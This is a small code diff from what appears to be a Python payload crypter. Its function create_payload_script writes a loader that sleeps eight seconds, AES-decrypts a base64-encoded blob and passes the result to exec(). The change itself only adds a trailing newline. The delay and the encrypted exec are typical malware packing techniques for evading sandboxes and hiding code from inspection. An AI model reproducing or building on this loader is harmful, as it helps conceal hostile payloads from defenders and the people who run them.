@@ -32,7 +32,7 @@ def create_payload_script(path, output, chave):
     payload += "from time import sleep\n"
     payload += "\n\nsleep(8)\n"
     payload += "aes = AES.new('{}', AES.MODE_ECB)\n".format(chave)
-    payload += "exec(aes.decrypt(b64decode('{}')).rstrip('{}'))".format(b64_encoded_AES_key, PAD)
+    payload += "exec(aes.decrypt(b64decode('{}')).rstrip('{}'))\n".format(b64_encoded_AES_key, PAD)
     insane_enc_template = open(output, 'a+')
     try:
         insane_enc_template.write(payload)
